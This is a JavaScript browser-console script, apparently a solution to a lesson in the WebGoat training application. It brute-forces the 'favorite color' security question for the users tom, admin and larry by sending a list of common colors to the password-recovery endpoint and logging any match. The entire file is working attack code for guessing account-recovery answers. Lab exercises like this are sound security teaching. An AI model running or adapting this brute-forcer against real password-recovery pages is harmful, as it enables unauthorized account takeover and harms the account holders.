// Security Questions Browser Console Attack
// Copy and paste this into browser console on the Password Recovery page

(async function() {
    console.log('===================================================================');
    console.log('SECURITY QUESTIONS BRUTE FORCE ATTACK');
    console.log('===================================================================');
    
    // Common colors for "What is your favorite color?" question
    const colors = [
        'red', 'blue', 'green', 'yellow', 'orange', 'purple', 'pink',
        'black', 'white', 'gray', 'grey', 'brown', 'cyan', 'magenta',
        'violet', 'indigo', 'turquoise', 'gold', 'silver', 'crimson',
        'navy', 'teal', 'lime', 'maroon', 'olive', 'aqua', 'fuchsia',
        'coral', 'salmon', 'peach', 'mint', 'lavender', 'tan', 'beige'
    ];
    
    // Target users
    const users = ['tom', 'admin', 'larry'];
    
    for (const user of users) {
        console.log('\n[*] Attacking user: ' + user);
        console.log('-------------------------------------------------------------------');
        
        let found = false;
        
        for (const color of colors) {
            console.log('  [+] Trying color: ' + color);
            
            try {
                const response = await fetch('/WebGoat/questions/question', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username: user,
                        securityQuestion: color
                    })
                });
                
                const data = await response.json();
                
                // Check for success indicators
                if (data.lessonCompleted || 
                    (data.feedback && !data.feedback.includes('not match')) ||
                    data.output) {
                    
                    console.log('  [SUCCESS] Found password for ' + user + '!');
                    console.log('  Security Answer: ' + color);
                    console.log('  Response:', JSON.stringify(data, null, 2));
                    found = true;
                    break;
                }
                
                // Small delay to avoid overwhelming server
                await new Promise(resolve => setTimeout(resolve, 100));
                
            } catch (error) {
                console.log('  [ERROR] ' + error.message);
            }
        }
        
        if (!found) {
            console.log('  [-] No password found for ' + user);
        }
    }
    
    console.log('\n===================================================================');
    console.log('ATTACK COMPLETED!');
    console.log('===================================================================');
})();
